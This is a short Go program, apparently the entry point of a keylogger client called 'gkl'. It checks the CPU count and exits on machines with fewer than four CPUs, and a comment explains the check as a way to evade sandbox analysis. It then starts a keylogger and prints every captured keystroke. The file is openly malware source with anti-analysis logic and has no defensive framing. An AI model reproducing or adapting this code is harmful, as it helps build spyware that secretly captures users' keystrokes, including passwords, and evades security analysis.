package main

import (
	"fmt"

	"github.com/Spriithy/gkl/client"
	"github.com/Spriithy/gkl/client/keylogger"
)

func main() {
	// Sandbox might not have this many CPUs...
	if client.SysInfo.CpuCount < 4 {
		return
	}

	fmt.Println(client.SysInfo.String())

	keystrokes := make(chan string)
	kl := keylogger.NewKeylogger(keystrokes)

	go kl.Decoder.Listen()
	go func() {
		for keystroke := range keystrokes {
			fmt.Print(keystroke)
		}
	}()

	kl.Start()
}
